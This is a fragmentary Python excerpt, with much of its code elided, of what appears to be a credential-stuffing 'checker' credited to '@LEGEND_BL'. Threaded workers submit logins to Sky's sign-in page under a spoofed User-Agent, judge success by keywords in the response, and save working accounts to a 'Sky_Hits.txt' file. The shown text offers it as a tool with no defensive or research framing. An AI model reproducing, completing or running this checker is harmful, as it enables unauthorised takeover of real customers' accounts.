...
def worker(q):
    ...
    while True:
        ...
        for attempt in range(2):
            try:
                login_url = "https://www.sky.com/signin/skyid"
                headers = {
                    "User-Agent": userA,
                ...
                if r.status_code == 200 and ("token" in r.text.lower() or "success" in r.text.lower() or "account" in r.text.lower()):
                    result = "hit"
                    with counters_lock: hit_counter += 1
                    with open("Sky_Hits.txt", "a", encoding="utf-8") as f:
...
# Code By - @LEGEND_BL
    ...
    print(f"{Fore.CYAN}Hits saved to Sky_Hits.txt")
    input(f"\nPress Enter to exit...")
# Code By - @LEGEND_BL
